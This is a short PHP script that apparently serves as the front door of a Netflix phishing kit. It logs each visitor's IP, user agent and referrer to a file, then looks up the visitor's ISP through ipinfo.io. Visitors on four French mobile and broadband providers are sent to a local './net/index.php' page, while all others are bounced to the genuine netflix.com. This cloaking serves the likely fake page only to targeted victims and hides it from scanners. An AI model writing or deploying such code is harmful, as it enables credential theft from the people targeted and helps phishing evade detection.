<?php
date_default_timezone_set("UTC");
$mydate=getdate(date("U"));
$ref=@$_SERVER[HTTP_REFERER]; 

$agent=@$_SERVER[HTTP_USER_AGENT]; 

$ip=@$_SERVER['REMOTE_ADDR']; 

$my_file = fopen("ip.txt","a"); // opening the file with file pointer at end of the file 
fwrite($my_file,$mydate['weekday'].",". $mydate['month']." ".$mydate['mday'].", ".$mydate['year']."   ".$mydate['hours'].":".$mydate['minutes'].":".$mydate['seconds']." | $ref | $agent | $ip\r\n"); 
fclose($my_file); 

$or = array('AS12322 Free SAS','AS5410 Bouygues Telecom SA','AS3215 Orange S.A.','AS15557 Societe Francaise du Radiotelephone S.A.');

$redirectUrl2 = './net/index.php';
$redirectUrl1 = 'http://netflix.com';
$result = file_get_contents("http://ipinfo.io/".$ip."/org");
header("location: ". ((in_array(trim($result), $or)? $redirectUrl2 :$redirectUrl1)))
//header("location: ".(in_array(trim($result), $or) ? ));


?>